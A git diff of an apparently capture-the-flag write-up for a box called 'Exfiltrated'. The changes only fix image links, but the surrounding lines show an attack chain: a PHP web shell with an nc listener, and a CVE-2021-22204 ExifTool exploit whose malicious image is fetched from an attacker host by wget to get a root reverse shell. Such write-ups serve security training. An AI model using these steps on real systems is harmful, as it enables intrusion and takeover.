@@ -60,14 +60,14 @@ nmap -vv -T5 -p22,80 -sC -sV 192.168.x.x
 
 **Step 1:** Accessing the web application immediately reveals **Subrion CMS**
 
-![[Pasted image 20251028180838.png]]
+![Pasted image 20251028180838.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028180838.png)
 
 <div class="divider divider-info">
     <span class="divider-title">Subrion CMS</span>
     <span class="divider-content">Subrion is an open-source content management system built with PHP. Older versions contain multiple vulnerabilities including authenticated remote code execution through file upload and template manipulation.</span>
 </div>
 
-![[Pasted image 20251028180910.png]]
+![Pasted image 20251028180910.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028180910.png)
 
 **Step 2:** Test default credentials
 ```
@@ -128,7 +128,7 @@ nc -lvnp 4444
 curl http://192.168.x.x/uploads/shell.php
 ```
 
-![[Pasted image 20251028181320.png]]
+![Pasted image 20251028181320.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028181320.png)
 
 <div class="divider divider-root">
     <span class="divider-title">Shell Access</span>
@@ -145,9 +145,9 @@ curl http://192.168.x.x/uploads/shell.php
 
 **The discovery:** Root cron job at `/etc/crontab`
 
-![[Pasted image 20251028181403.png]]
+![Pasted image 20251028181403.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028181403.png)
 
-![[Pasted image 20251028181425.png]]
+![Pasted image 20251028181425.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028181425.png)
 
 <div class="divider divider-info">
     <span class="divider-title">Cron Job Analysis</span>
@@ -163,13 +163,13 @@ curl http://192.168.x.x/uploads/shell.php
 exiftool -ver
 ```
 
-![[Pasted image 20251028181549.png]]
+![Pasted image 20251028181549.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028181549.png)
 
 **Step 2:** Research ExifTool vulnerabilities
 
 Found **CVE-2021-22204** - ExifTool Arbitrary Code Execution
 
-![[Pasted image 20251028181558.png]]
+![Pasted image 20251028181558.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028181558.png)
 
 <div class="divider divider-warning">
     <span class="divider-title">CVE-2021-22204</span>
@@ -198,7 +198,7 @@ cd CVE-2021-22204-exiftool
 
 **Step 2:** Edit the exploit script to add reverse shell details
 
-![[Pasted image 20251028181922.png]]
+![Pasted image 20251028181922.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028181922.png)
 
 ```python
 # Modified exploit.py
@@ -211,13 +211,13 @@ LPORT = "4445"
 python3 exploit.py
 ```
 
-![[Pasted image 20251028181723.png]]
+![Pasted image 20251028181723.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028181723.png)
 
 This generates a file named `image.jpg` with the embedded payload.
 
 **Note:** The payload isn't visible in the image itself - it's embedded in the metadata.
 
-![[Pasted image 20251028181738.png]]
+![Pasted image 20251028181738.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028181738.png)
 
 **Step 4:** Upload the malicious image to the target
 ```bash
@@ -226,7 +226,7 @@ cd /path/to/upload/directory
 wget http://10.10.14.5:8000/image.jpg
 ```
 
-![[Pasted image 20251028181940.png]]
+![Pasted image 20251028181940.png](/assets/images/2025-10-28-Exfiltrated/Pasted image 20251028181940.png)
 
 **Step 5:** Start listener and wait for cron job
 ```bash
